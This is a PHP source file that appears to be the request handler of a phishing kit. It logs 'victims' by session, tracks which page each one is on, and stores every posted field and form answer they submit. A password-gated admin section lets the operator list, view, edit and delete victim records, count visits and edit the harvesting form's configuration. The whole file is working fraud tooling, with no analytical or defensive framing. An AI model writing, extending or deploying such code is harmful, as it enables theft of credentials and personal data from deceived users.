<?php
require_once('functions.php');

if(empty($_GET['action']) && empty($_POST['action']))
{
    return;
}

$action = !empty($_GET['action']) ? $_GET['action'] : $_POST['action'];


if($action == "heartbeat")
{
    echo $victim->heartbeat($_SESSION['ent_id'], $_GET['currentpage']);
}
else if($action == "send_data")
{
    $victim_id = isset($_SESSION['ent_id']) ? $_SESSION['ent_id'] : 0;
    echo $victim->victim_data($victim_id, $_POST['currentpage'], $_POST);
}
else if($action == "form_submit")
{
    header('Content-type: text/plain');

    $answers = [];
    if (!empty($_POST['answers'])) {
        $decoded = json_decode($_POST['answers'], true);
        if (is_array($decoded)) {
            $answers = $decoded;
        }
    }

    $victim_id = isset($_SESSION['ent_id']) ? $_SESSION['ent_id'] : 0;
    echo $victim->saveFormData($victim_id, $answers);
}

if(!empty($_SESSION['admin_pass']) && $_SESSION['admin_pass'] == ADMIN_PASS)
{
    if($action == "victim")
    {
        if(empty($_GET['id']))
        {
            return;
        }
        header('Content-type: application/json');
    
        echo json_encode($admin->getVictim($_GET['id']));
    }
    else if($action == "victims")
    {
        header('Content-type: application/json');
        echo json_encode($admin->getAllVictims());
    }
    else if($action == "update_data")
    {
        if(empty($_POST['ent_id']))
        {
            return;
        }
    
        echo $admin->updateVictim($_POST['ent_id'], $_POST);
    }
    else if($action == "entity_delete")
    {
        if(empty($_POST['ent_id']))
        {
            return;
        }
    
        $admin->deleteVictim($_POST['ent_id']);
    }
    else if($action == "reset_all")
    {
        header('Content-type: text/plain');

        if (empty($admin)) {
            http_response_code(403);
            echo '0';
            exit;
        }

        echo $admin->resetAll();
        exit;
    }
    else if($action == "visitor_count")
    {
        require_once dirname(__FILE__) . '/visits.php';
        echo get_visit_count();
    }
    else if($action == "form_config")
    {
        require_once dirname(__FILE__) . '/form_config.php';
        header('Content-type: application/json');
        echo json_encode(get_form_config());
    }
    else if($action == "form_save")
    {
        require_once dirname(__FILE__) . '/form_config.php';
        header('Content-type: text/plain');

        if (empty($_POST['config'])) {
            echo '0';
            exit;
        }

        $data = json_decode($_POST['config'], true);
        if (!is_array($data)) {
            echo '0';
            exit;
        }

        echo save_form_config($data) ? '1' : '0';
    }
}


?>